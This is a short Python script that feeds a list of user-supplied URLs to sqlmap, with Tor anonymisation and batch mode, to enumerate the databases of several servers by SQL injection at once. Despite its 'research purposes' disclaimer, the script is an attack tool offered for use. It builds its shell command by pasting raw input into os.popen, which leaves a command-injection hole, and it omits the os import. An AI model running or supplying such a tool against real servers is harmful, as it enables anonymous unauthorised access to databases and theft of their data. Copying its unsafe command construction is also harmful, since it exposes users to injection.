# a quick way to see if urls are exploitable
# an automated way to see if multiple servers can be sql injected

# NOTE: only for research purposes, don't do anything illegal

def main():
    urls = get_input("URLS (Comma-separated values): ")
    urls = urls.split(",")

    # a may not need stdout/err
    for url in urls:
        stdout = os.popen('sqlmap -u "' + url + '" --dbs --batch --tor --check-tor')

def get_input(msg):
    while (True):
        user_input = str(input(msg))

        if (not user_input):
            print(":: not a valid entry")
        else:
            break
    return user_input

main()
